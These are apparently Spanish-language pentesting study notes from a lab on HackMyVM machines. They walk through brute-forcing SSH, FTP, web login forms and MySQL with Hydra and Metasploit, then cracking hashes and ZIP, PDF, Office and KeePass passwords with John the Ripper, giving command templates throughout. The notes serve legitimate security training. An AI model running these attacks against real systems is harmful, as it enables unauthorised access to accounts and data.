rar- Ataque de fuerza bruta.



==ATAQUE A CONTRASEÑAS (SSH Y FTP)
- Vamos a utilizar una maquina de `HackMyVM`.

![](../Imagenes/Pasted%20image%2020241212202241.png)

- Tenemos 3 puertos abiertos.
- Los puertos 21 y 22 por lo general son puertos donde se pueden hacer fuerza bruta.

==PARA PUERTO 22 (SSH)==

![](../Imagenes/Pasted%20image%2020241212203134.png)

- Ya tenemos la clave:

![](../Imagenes/Pasted%20image%2020241212203249.png)

- Vamos a entrar por el puerto usando estos datos con el siguiente comando:
```
ssh (USUARIO)@(IP_VICTIMA)
```

![](../Imagenes/Pasted%20image%2020241212203359.png)


- Ingresamos la contraseña y listo.

![](../Imagenes/Pasted%20image%2020241212203434.png)


==PARA PUERTO 21 (FTP)==

![](../Imagenes/Pasted%20image%2020241212203537.png)

- La diferencia es cambiar de ssh a ftp.
- Cuando tengamos la contraseña, la forma de entrar al puerto ftp es con este comando:
```
ftp (IP_VICTIMA)
```
- Agregamos el usuario y la contraseña y ya estamos dentro.

![](../Imagenes/Pasted%20image%2020241212203726.png)



==ATAQUE A USUARIOS==
- En este caso solo cambian 2 cosas,
	- 1.- Como nos falta el usuario el -l es en mayuscula (-L) y el -p es en minuscula.
	- 2.- El diccionario para usuario es diferente.
		`/usr/share/wordlists/metasploit/unix_users.txt`

![](../Imagenes/Pasted%20image%2020241212210549.png)

- Si no sale ningún resultado, usamos el diccionario `rockyou.txt`.



==FUERZA BRUTA A PANELES DE LOGIN WEB

- En este caso, entramos a la pagina del puerto 80 de la maquina victima y nos encontramos con un login web.

- Se recomienda siempre probar con admin en usuario.
- Para este caso vamos a usar la herramienta `burp suite`.
	- Esta herramienta intercepta una petición HTTP.
	- sabemos que para usar burt suip tenemos que ir a ajustes del navegador y cambiar el proxy a manual he ingresar nuestro local host con el puerto 8080

	![](../Imagenes/Pasted%20image%2020241212212634.png)
	
	- Se cambia por este dato 

	![](../Imagenes/Pasted%20image%2020241212213159.png)
	
	
- Dejamos interceptando Burt Suite.

![](../Imagenes/Pasted%20image%2020241212212741.png)

- Nos vamos a la pagina web y mandamos la petición poniendo como usuario admin y contraseña admin

![](../Imagenes/Pasted%20image%2020241212212828.png)

- Y le damos a login.
- Nos saldrá lo siguiente:

![](../Imagenes/Pasted%20image%2020241212213242.png)

- Teniendo estos datos nos vamos a hydra.
- Usamos el siguiente comando:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt (IP_VICTIMA) http-post-form "(RUTA URL):username=admin&password=^PASS^:(MENSAJE_DE_ERROR_DE_LA_PAG)"
```

==ATAQUE HTTP GET BASICO==
```
hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 1 -f (IP_VICTIMA) http-get (DIRECTORIO)
```
- http-post-form -> se le indica si esta petición se esta tramitando por post o por get.
	- Como sabemos esto? , Burt Suite nos lo entrega en la primera línea al interceptar una petición HTTP.
- La ruta URL que va al final de comando también la entrega Burt Suite en la primera línea después de POST.
- Después de la URL ponemos lo que nos entrega la línea 16 de Burt Suite, pero como no tenemos el password cambiamos el admin por ^PASS^. Lo mismo si no tuviéramos el usuario.
- El mensaje de erro aparece cuando en la web login no acertamos la contraseña.

![](../Imagenes/Pasted%20image%2020241212215039.png)



![](../Imagenes/Pasted%20image%2020241212214340.png)

- Ya tendríamos la password.


==ATAQUES DE FUERZA BRUTA CON METASPLOIT

PUERTO 21
- Dentro de Metasploit, vamos a buscar un modulo para poder autenticarnos por el puerto ftp (21).
```
search ftp_login
```

![](../Imagenes/Pasted%20image%2020241213171610.png)

- Vamos a utilizar este modulo usando el comando `use` .

![](../Imagenes/Pasted%20image%2020241213171653.png)

- Vamos a configurarlo usando el comando `show options`.
- Vamos a configurar solo 2 parámetros:
	- PASS_FILE
	- USERNAME

![](../Imagenes/Pasted%20image%2020241213171810.png)

- En la descripción de PASS_FILE nos sale lo siguiente:

![](../Imagenes/Pasted%20image%2020241213171909.png)

- Eso quiere decir que el archivo contiene una contraseña, una por línea, por ende vamos a agregar el diccionario `rockyou.txt`.

![](../Imagenes/Pasted%20image%2020241213172033.png)

- En este caso ya sabemos que el usuario es Juan, así que vamos a agregarlo en USERNAME.
- Ahora solo nos queda configurar el RHOST que en este caso seria la IP de la victima
- Quedaría de esta manera:

![](../Imagenes/Pasted%20image%2020241213172706.png)

- Y ejecutamos
- El ataque por Metasploit es un poco lento.

![](../Imagenes/Pasted%20image%2020241213173921.png)


PUERTO 22 (SSH)
- Lo mismo que con el puerto 21 solo cambia el comando.
```
search ssh_login
```

![](../Imagenes/Pasted%20image%2020241213174353.png)

- Repetimos los mismos pasos.


==ATAQUES DE FUERZA BRUTA CONTRA BASES DE DATOS

- Base de dato mySQL
- El puerto 3306 corre por defecto mySQL.
- Cuando consigamos el usuario o la contraseña vamos a ocupar este comando:
```
hydra -l (USUARIO) -P /usr/share/wordlists/rockyou.txt mysql://(IP_VICTIMA)
```

![](../Imagenes/Pasted%20image%2020241213180459.png)

- Puede que la contraseña se encuentre al final del diccionario, para eso hay un comando que pide a Hydra empezar desde el final.
```
tac /usr/share/wordlists/rockyou.txt > rockyou_invertido.txt
```
- El comando tac invierte cualquier archivo .txt, un diccionario, etc.
- Suele suceder que cuando se utiliza el comando `tac`, al momento de leer el diccionario abra un error, este error se genera porque dentro de la lista se generan espacios.

![](../Imagenes/Pasted%20image%2020241213181431.png)
- Para solucionar esto, vamos a eliminar la primera línea, y eliminar las letras y símbolos amarillos de las otras líneas.
![[Pasted image 20241213181556.png]]
- Ahora usamos el siguiente comando para eliminar los espacios:
```
cat rockyou_invertido.txt | tr -d ' ' > diccionario_sin_espacios.txt
```
- Ya con esto listo podemos hacer el ataque de fuerza bruta utilizando el diccionario sin espacio.
![[Pasted image 20241213181937.png]]
- Y listo! se demoro mucho menos.
![[Pasted image 20241213182048.png]]
- Ahora, para logearnos en el MySQL debemos usar el siguiente código:
```
mysql -h (IP_VICTIMA) -u (USUARIO) -p(CONTRASEÑA)
```
![[Pasted image 20241213182307.png]]
- Si nos sale este error:
![[Pasted image 20241213182517.png]]
- Es porque MySQL no confía en un certificado autofirmado en la cadena de certificados.
- Usamos el siguiente código para desactivarlo:
```
--ssl-mode=DISABLED
```
- Este código va al final.
![[Pasted image 20241213182834.png]]
- Si sigue tirando error, vamos a probar con los siguiente:
- Vamos a abrir el archivo de configuración.
```
sudo nano /etc/mysql/my.cnf
```
- Hay que añadir la siguiente línea bajo la sección [client]
```
ssl-mode=DISABLED
```
- Guardamos y volvemos  a probar
![[Pasted image 20241213183329.png]]

==FUERZA BRUTA EN LOCAL CON JOHN THE RIPPER

- Los formatos que se pueden craquear con sus respectivos comandos:
	- Contraseñas UNIX(DES, MD5, Blowfish, SHA-256, SHA-512)
		- ==john --format=crypt archivo_hashes.txt
	- Contraseñas Windows(LM, NTLM) :
		- ==john --format=ln archivo_hashes.txt
		- ==john --format=nt archivo_hashes.txt
	- Contraseña ZIP:
		- ==zip2jonh archibo.zip > archivo_hashes.txt
	- Contraseña PDF:
		- ==pdf2john archivo.pdf > archivo_hashes.txt
	- Contraseña RAR:
		- ==rar2john archivo.rar > archivo_hashes.txt
	- Contraseña de archivo OFFICE(Word, Excel, etc):
		- ==office2john archivo.doc > archivo_hashes.txt
	- Contraseña MySQL:
		- ==john --format=mysql archivo_hashes.txt
	- Contraseña POSTGRESQL:
		- ==john --format=postgres archivo_hashes.txt
	- Contraseña ORACLE:
		- ==john --format=oracle archivo_hashes.txt
	- Contraseña KEEPASS
		- ==keepass2john archivo.kdbx > archivo_hashes.txt
	- Contraseña HASH:
		- ==john --wordlist=/usr/share/wordlists/rockyou.txt archivo_hashes.txt
		- Si no encuentra la contraseña es porque hay que especificar el HAS y eso lo podemos ver utilizando la herramienta `hash-identifier` , lo abrimos y pegamos el HASH que estamos craqueando y sale que HAS es.
		- ==john --format=Raw-(FORMATO) --wordlist=/usr/share/wordlists/rockyou.txt archivo_hashes.txt

- Vamos a crackear un archivo .zip para eso lo vamos a crear desde windows y lo vamos a compartir levantando un servidor con python.
- El comando en windows es:
```
python -m http.server 80
```
![[Pasted image 20241213190104.png]]
- En Kali usamos el siguiente comando:
```
wget (IP_DE_LA_MAQUINA_QUE_TIENE_EL_ARCHIVO)/(NOMBRE_DEL_ARCHIVO)
```
![[Pasted image 20241213190337.png]]
- Ya descargado vamos a craquearlo.
- se usa el siguiente codigo:
```
zip2john (NOMBRE_ARCHIVO) > (NUEVO_NOMBRE)
```
- zip2john extrae hashes de contraseñas de archivos comprimidos en formato ZIP.
- Ahora utilizamos:
```
john --wprdlist=/usr/share/wordlists/rockyou.txt (NOMBRE_NUEVO)
```
- Y me va a craquear el archivo.